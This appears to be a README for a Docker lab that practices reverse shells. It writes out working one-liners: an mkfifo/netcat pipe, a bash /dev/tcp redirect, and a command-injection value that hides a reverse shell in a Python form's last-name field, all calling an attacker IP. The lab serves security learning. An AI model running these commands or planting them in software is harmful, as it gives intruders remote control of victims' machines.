# Testing Reverse Shells

## Bash

This is a "sandbox" environment for playing around with reverse shells.
We will be using
[guthub.com/PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
as a reference guide throughout.

The [Makefile](./Makefile) has recipes for running 2 containers in their own
[docker networks](https://docs.docker.com/network/).

Once you've run your two containers, you can test the set-up by running the following one-liner
```
rm /tmp/cache.so3fk2; mkfifo /tmp/cache.so3fk2; cat /tmp/cache.so3fk2 | /bin/sh -i 2>&1 | nc <attacker IP> 4444 > /tmp/cache.so3fk2
```
on the "exploit" container.
To do so, run `make exploit-exec` and make sure to use the IP address of the attacker container.

For the above to do anything, you'll need to create a "server" on the attacker (this is a reverse shell after all)
```
nc -lvnp 4444
```

The former command relies on `mkfifo`:
> Once you have created a FIFO special file in this way, any process can open it for reading or writing,
> in the same way as an ordinary file. However, it has to be open at both ends simultaneously before you
> can proceed to do any input or output operations on it. Opening a FIFO for reading normally blocks
> until some other process opens the same FIFO for writing, and vice versa.
See [https://linux.die.net/man/3/mkfifo](https://linux.die.net/man/3/mkfifo).


---

## Bash: no nc

In the previous example, we had to install `netcat` into the victim machine.
If this is not applicable, then let's abuse some of the redirection features of `bash`.

Couple things to note, all from [Bash Reference Manual](https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections)

> If the file descriptor number is omitted, and the first character of the redirection
> operator is `<`, the redirection refers to the standard input (file descriptor 0).
> If the first character of the redirection operator is `>`, the redirection refers to
> the standard output (file descriptor 1).

Worth mentioning that `&>word` is equivalent to `>word 2>&1` - it redirects stdout and stderr.

> Bash handles several filenames specially when they are used in redirections...
> If the operating system on which Bash is running provides these special files, bash
> will use them; otherwise it will emulate them internally with the behavior described below.
>
> `/dev/tcp/host/port`
>   If host is a valid hostname or Internet address, and port is an integer port number or
>   service name, Bash attempts to open the corresponding TCP socket.
>
> `/dev/udp/host/port`
>   If host is a valid hostname or Internet address, and port is an integer port number or
>    service name, Bash attempts to open the corresponding UDP socket.

```
/bin/sh -i >& /dev/tcp/<attacker IP>/4444 0>&1
```

---

## Python

It is possible that every now and then someone will use some insecure Python feature.
Something less trivial however, is when people design Python apps that delegate to CLIs.
Take a look at the this interesting story from the SentinelOne people:
[Pwning Microsoft Azure Defender for IoT | Multiple Flaws Allow Remote Code Execution for All](https://www.sentinelone.com/labs/pwning-microsoft-azure-defender-for-iot-multiple-flaws-allow-remote-code-execution-for-all/)

If we use the `subprocess` call that is vulnerable to code injection, then sending a last name such as
```
Doe; bash -c "/bin/sh -i >& /dev/tcp/192.168.160.3/4444 0>&1"
```
will work.

In general,
[Command injection prevention for Python](https://semgrep.dev/docs/cheat-sheets/python-command-injection/)
has some good recommendations that will help you look for code injection vulnerabilities that may in turn
allow you to setup a rever-shell.

References
- [Digitalocean tutorials: how to make a web application using flask in python3](https://www.digitalocean.com/community/tutorials/how-to-make-a-web-application-using-flask-in-python-3)
- [Flask documentation: Uploading Files](https://flask.palletsprojects.com/en/2.1.x/patterns/fileuploads/)
- [Handling File Uploads With Flask](https://blog.miguelgrinberg.com/post/handling-file-uploads-with-flask)
